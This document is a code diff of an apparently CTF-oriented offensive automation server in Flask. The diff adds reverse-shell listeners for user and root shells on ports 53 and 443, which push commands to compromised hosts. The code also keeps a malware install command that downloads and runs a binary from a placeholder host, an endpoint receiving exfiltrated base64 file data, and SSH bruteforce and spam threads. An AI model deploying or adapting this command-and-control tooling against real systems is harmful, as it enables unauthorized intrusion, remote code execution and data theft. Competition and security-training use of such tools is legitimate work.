@@ -32,13 +32,14 @@ DEFAULT_WHITELISTED_IPS = "127.0.0.1"
 DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
 DEFAULT_MALWARE_PATH = "malware_installer"
 DEFAULT_MALWARE_INSTALL = "curl -o installer http://CHANGE_ME/i && chmod +x installer && ./installer"
+DEFAULT_MALWARE_REV_SHELL_PORT_USER = "53"
+DEFAULT_MALWARE_REV_SHELL_PORT_ROOT = "443"
 DEFAULT_STATUS_PWNED_TIMEOUT = "300"
 DEFAULT_STATUS_FLAGS_TIMEOUT = "300"
 DEFAULT_STATUS_INTERVAL = "10"
 DEFAULT_RUN_SCRIPTS_INTERVAL = "30"
 DEFAULT_SSH_BRUTEFORCE_INTERVAL = "30"
 DEFAULT_SSH_BRUTEFORCE_TIMEOUT = "5"
-DEFAULT_RUN_FLAG_RETRIEVALS_INTERVAL = "30"
 DEFAULT_SPAM_INTERVAL_MIN = "5"
 DEFAULT_SPAM_INTERVAL_MAX = "20"
 DEFAULT_SPAM_TIMEOUT = "5"
@@ -64,6 +65,10 @@ def main():
     add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
     add_setting("malware_path", DEFAULT_MALWARE_PATH, "Path to first stage of binary")
     add_setting("malware_install", DEFAULT_MALWARE_INSTALL, "Command to install malware")
+    add_setting("malware_rev_shell_port_user", DEFAULT_MALWARE_REV_SHELL_PORT_USER,
+                "Port malware tries to connect to for user shell")
+    add_setting("malware_rev_shell_port_root", DEFAULT_MALWARE_REV_SHELL_PORT_ROOT,
+                "Port malware tries to connect to for root shell")
     add_setting("status_pwned_timeout", DEFAULT_STATUS_PWNED_TIMEOUT,
                 "Timeout, in seconds, when to stop assuming box is pwned")
     add_setting("status_flags_timeout", DEFAULT_STATUS_FLAGS_TIMEOUT,
@@ -74,8 +79,6 @@ def main():
                 "Seconds to wait between each SSH bruteforce")
     add_setting("ssh_bruteforce_timeout", DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
                 "Seconds to wait for timeout during SSH bruteforce")
-    add_setting("run_flag_retrievals_interval", DEFAULT_RUN_FLAG_RETRIEVALS_INTERVAL,
-                "Seconds to wait between running flag retrievals")
     add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
     add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
     add_setting("spam_timeout", DEFAULT_SPAM_TIMEOUT, "Seconds to wait for timeout during spamming")
@@ -87,9 +90,10 @@ def main():
 
     # Start threads
     THREADS.append(Thread(target=status, name="status"))
+    THREADS.append(Thread(target=rev_shell_user_server, name="rev_shell_user_server"))
+    THREADS.append(Thread(target=rev_shell_root_server, name="rev_shell_root_server"))
     THREADS.append(Thread(target=run_scripts, name="run_scripts"))
     THREADS.append(Thread(target=ssh_bruteforce, name="ssh_bruteforce"))
-    THREADS.append(Thread(target=run_flag_retrievals, name="run_flag_retrievals"))
     THREADS.append(Thread(target=spam, name="spam"))
     for thread in THREADS:
         thread.start()
@@ -217,7 +221,7 @@ def admin_teams_add():
     # Add to database
     db.session.add(Team(num, name))
     for service in Service.query.all():
-        db.session.add(Box(num, service.ip, False, None, False, None))
+        db.session.add(Box(num, service.ip, False, False, None, False, None))
     db.session.commit()
 
     # Flash and redirect
@@ -275,7 +279,7 @@ def admin_services_add():
     # Add to database
     db.session.add(Service(ip, name, port, ssh_port))
     for team in Team.query.all():
-        db.session.add(Box(team.num, ip, False, None, False, None))
+        db.session.add(Box(team.num, ip, False, False, None, False, None))
     db.session.commit()
 
     # Flash and redirect
@@ -421,10 +425,11 @@ def admin_flagrets():
 def admin_flagrets_add():
     # Get form data
     service_ip = request.form.get("service_ip")
+    root_shell = str_to_bool(request.form.get("root_shell"))
     command = request.form.get("command")
 
     # Add to database
-    db.session.add(FlagRetrieval(service_ip, command))
+    db.session.add(FlagRetrieval(service_ip, root_shell, command))
     db.session.commit()
 
     # Flash and redirect
@@ -454,11 +459,13 @@ def admin_flagrets_update():
     # Get form data
     id = request.form.get("id")
     service_ip = request.form.get("service_ip")
+    root_shell = str_to_bool(request.form.get("root_shell"))
     command = request.form.get("command")
 
     # Update in database
     flag_retrieval = FlagRetrieval.query.get(id)
     flag_retrieval.service_ip = service_ip
+    flag_retrieval.root_shell = root_shell
     flag_retrieval.command = command
     db.session.commit()
 
@@ -588,7 +595,7 @@ def exfil():
     # Get form data
     victimip = request.form.get("victimip")
     filename = request.form.get("filename")
-    data = request.form.get("file")
+    b64_data = request.form.get("file")
 
     # Check if it exists
     if not victimip:
@@ -597,13 +604,13 @@ def exfil():
     elif not filename:
         log("exfil_endpoint", f"filename missing from {request.remote_addr}")
         return ""
-    elif not data:
+    elif not b64_data:
         log("exfil_endpoint", f"data missing from {request.remote_addr}")
         return ""
 
     # Decode data
     try:
-        exfil = b64decode(data).decode("utf-8")
+        data = b64decode(b64_data).decode("utf-8")
     except:
         log("exfil_endpoint", f"b64 decode error on victimip {victimip} from {request.remote_addr}")
         return ""
@@ -618,50 +625,15 @@ def exfil():
 
     # Save the data and extract flags
     try:
-        db.session.add(ExfilData(team, service, filename, exfil, datetime.now()))
+        db.session.add(ExfilData(team, service, filename, data, datetime.now()))
         db.session.commit()
     except:
         log("exfil_endpoint",
             f"error adding data for team {team} and service {service} for file {filename} from {request.remote_addr}")
         return ""
-    extract_flags(exfil, team, service, "exfil")
+    extract_flags(data, Box.query.get((team, service)), "exfil")
     log("exfil_endpoint", f"saved data from team {team} and service {service} from {request.remote_addr}")
     return ""
-
-
-# Update route
-@app.route("/u", methods=["POST"])
-def update():
-    # Get form data
-    victimip = request.form.get("victimip")
-
-    # Check if it exists
-    if not victimip:
-        log("update_endpoint", f"victimip missing from {request.remote_addr}")
-        return ""
-
-    # Get team and service
-    try:
-        team = victimip.split(".")[2]
-        service = victimip.split(".")[3]
-    except:
-        log("update_endpoint", f"error decoding IP {victimip} from {request.remote_addr}")
-        return ""
-
-    # Get the Box
-    box = Box.query.get((team, service))
-    if not box:
-        log("update_endpoint", f"no record for team {team} and service {service} from {request.remote_addr}")
-        return ""
-
-    # Update the Box
-    box.pwned = True
-    box.last_update = datetime.now()
-    db.session.commit()
-
-    # Return the status
-    log("update_endpoint", f"status {box.status} sent to team {team} and service {service} from {request.remote_addr}")
-    return box.status
 
 
 # </editor-fold>
@@ -716,6 +688,111 @@ def status():
         time.sleep(interval)
 
 
+def rev_shell_user_server():
+    # Get settings from database
+    try:
+        port = int(Setting.query.get("malware_rev_shell_port_user").value)
+    except:
+        log("rev_shell_user_server", "Invalid malware_rev_shell_port_user setting")
+        port = DEFAULT_MALWARE_REV_SHELL_PORT_USER
+
+    # Start listening
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", port))
+    s.listen(100)
+    log("rev_shell_user_server", f"listening on port {port}")
+
+    # Keep accepting connections
+    while True:
+        (client, (client_ip, client_port)) = s.accept()
+        log("rev_shell_user_server", f"new connection from {client_ip} on port {client_port}")
+        Thread(target=new_rev_shell, args=[False, client, client_ip]).start()
+
+
+def rev_shell_root_server():
+    # Get settings from database
+    try:
+        port = int(Setting.query.get("malware_rev_shell_port_root").value)
+    except:
+        log("rev_shell_root_server", "Invalid malware_rev_shell_port_root setting")
+        port = DEFAULT_MALWARE_REV_SHELL_PORT_ROOT
+
+    # Start listening
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", port))
+    s.listen(100)
+    log("rev_shell_root_server", f"listening on port {port}")
+
+    # Keep accepting connections
+    while True:
+        (client, (client_ip, client_port)) = s.accept()
+        log("rev_shell_root_server", f"new connection from {client_ip} on port {client_port}")
+        Thread(target=new_rev_shell, args=[True, client, client_ip]).start()
+
+
+def new_rev_shell(root_shell, client, ip):
+    # Set logging type
+    if root_shell:
+        log_type = "rev_shell_root_server"
+    else:
+        log_type = "rev_shell_user_server"
+
+    # Check if valid IP
+    if not ip.startswith(half_subnet()):
+        log(log_type, f"invalid IP from {ip}")
+        return
+
+    # Update box pwned status
+    parts = ip.split(".")
+    team_num = int(parts[2])
+    service_ip = int(parts[3])
+    box = Box.query.get((team_num, service_ip))
+    if not box:
+        log(log_type, f"could not find box for ip {ip}")
+        return
+    box.pwned = True
+    if root_shell:
+        box.pwned_root = True
+    box.last_update = datetime.now()
+    db.session.commit()
+
+    # Check for commands to run
+    commands = []
+    for flag_retrievals in FlagRetrieval.query.filter_by(service_ip=service_ip, root_shell=False).all():
+        commands.append(flag_retrievals.command)
+    for queued_command in QueuedCommand.query.filter_by(team_num=team_num, service_ip=service_ip,
+                                                        root_shell=False).all():
+        commands.append(queued_command.command)
+        db.session.delete(queued_command)
+        db.session.commit()
+    if root_shell:
+        for flag_retrievals in FlagRetrieval.query.filter_by(service_ip=service_ip, root_shell=True).all():
+            commands.append(flag_retrievals.command)
+        for queued_command in QueuedCommand.query.filter_by(team_num=team_num, service_ip=service_ip,
+                                                            root_shell=True).all():
+            commands.append(queued_command.command)
+            db.session.delete(queued_command)
+            db.session.commit()
+
+    # Send the commands
+    data = ""
+    for command in commands:
+        log(log_type, f"sending command '{command}' to IP {ip}")
+        client.send(str.encode(command + "\n"))
+        data = b""
+        while True:
+            data += client.recv(512)
+            if len(data) < 1:
+                break
+        data = data.decode("utf-8")
+        log(log_type, f"received '{data}' from IP {ip}")
+    extract_flags(data, box, log_type)
+
+    # Close the connection
+    client.shutdown(2)
+    client.close()
+
+
 def run_scripts():
     # Continue running scripts
     while True:
@@ -758,7 +835,7 @@ def run_scripts():
                     log("run_scripts", f"script {script.path} against {ip} received '{output}'")
 
                     # Extract the flags
-                    extract_flags(output, box.team_num, box.service_ip, f"script {script.path}")
+                    extract_flags(output, box, f"script {script.path}")
 
         # Wait until next run
         log("run_scripts", f"sleeping for {interval} seconds")
@@ -829,36 +906,6 @@ def ssh_bruteforce():
             # Wait until next try
             log("ssh_bruteforce", f"sleeping for {interval} seconds")
             time.sleep(interval)
-
-
-def run_flag_retrievals():
-    # Continue checking
-    while True:
-
-        # Get settings from database
-        try:
-            interval = int(Setting.query.get("run_flag_retrievals_interval").value)
-        except:
-            log("run_flag_retrievals", "Invalid run_flag_retrievals_interval setting")
-            interval = DEFAULT_RUN_FLAG_RETRIEVALS_INTERVAL
-
-        # Get all flag retrievals
-        flag_retrievals = FlagRetrieval.query.all()
-
-        # Get all boxes
-        boxes = Box.query.all()
-
-        # Iterate over flag retrievals
-        for flag_retrieval in flag_retrievals:
-
-            # Iterate over boxes
-            for box in boxes:
-                if box.service_ip == flag_retrieval.service_ip:
-                    continue
-
-        # Wait until next check
-        log("run_flag_retrievals", f"sleeping for {interval} seconds")
-        time.sleep(interval)
 
 
 def spam():
@@ -944,18 +991,21 @@ def add_setting(name, default, description):
         db.session.commit()
 
 
-def extract_flags(data, team_num, service_ip, source):
+def extract_flags(data, box, source):
     # Find and add the new flags to the database
     regex = re.compile(Setting.query.get("flag_regex"))
     flags = re.findall(regex, data)
     new_flags = []
     for flag in flags:
         if not Flag.query.get(flag):
-            new_flag = Flag(flag, team_num, service_ip, source, datetime.now(), None)
+            new_flag = Flag(flag, box.team_num, box.service_ip, source, datetime.now(), None)
             new_flags.append(new_flag)
             db.session.add(new_flag)
+            box.last_flag = datetime.now()
+            box.flags = True
             db.session.commit()
-            log("extract_flags", f"new flag {flag} added from team {team_num} and service {service_ip} from {source}")
+            log("extract_flags",
+                f"new flag {flag} added from team {box.team_num} and service {box.service_ip} from {source}")
 
     # Submit the flags
     for flag in new_flags:
@@ -965,7 +1015,7 @@ def extract_flags(data, team_num, service_ip, source):
             flag.submitted = datetime.now()
             db.session.commit()
             log("extract_flags",
-                f"flag {flag} successfully submitted from team {team_num} and service {service_ip} from {source}")
+                f"flag {flag} successfully submitted from team {box.team_num} and service {box.service_ip} from {source}")
 
 
 def get_ip(subnet, box):
@@ -1072,14 +1122,16 @@ class Box(db.Model):
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), primary_key=True)
     service = db.relationship(Service, backref=db.backref("boxes", cascade="all, delete-orphan"))
     pwned = db.Column(db.Boolean, nullable=False)
+    pwned_root = db.Column(db.Boolean, nullable=False)
     last_update = db.Column(db.DateTime, nullable=True)
     flags = db.Column(db.Boolean, nullable=False)
     last_flag = db.Column(db.DateTime, nullable=True)
 
-    def __init__(self, team_num, service_ip, pwned, last_update, flags, last_flag):
+    def __init__(self, team_num, service_ip, pwned, pwned_root, last_update, flags, last_flag):
         self.team_num = team_num
         self.service_ip = service_ip
         self.pwned = pwned
+        self.pwned_root = pwned_root
         self.last_update = last_update
         self.flags = flags
         self.last_flag = last_flag
@@ -1139,10 +1191,28 @@ class FlagRetrieval(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
     service = db.relationship(Service, backref=db.backref("flag_retrievals", cascade="all, delete-orphan"))
+    root_shell = db.Column(db.Boolean, nullable=False)
     command = db.Column(db.Text, nullable=False)
 
-    def __init__(self, service_ip, command):
+    def __init__(self, service_ip, root_shell, command):
         self.service_ip = service_ip
+        self.root_shell = root_shell
+        self.command = command
+
+
+class QueuedCommand(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
+    team = db.relationship(Team, backref=db.backref("queued_commands", cascade="all, delete-orphan"))
+    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
+    service = db.relationship(Service, backref=db.backref("queued_commands", cascade="all, delete-orphan"))
+    root_shell = db.Column(db.Boolean, nullable=False)
+    command = db.Column(db.Text, nullable=False)
+
+    def __init__(self, team_num, service_ip, root_shell, command):
+        self.team_num = team_num
+        self.service_ip = service_ip
+        self.root_shell = root_shell
         self.command = command
 
 
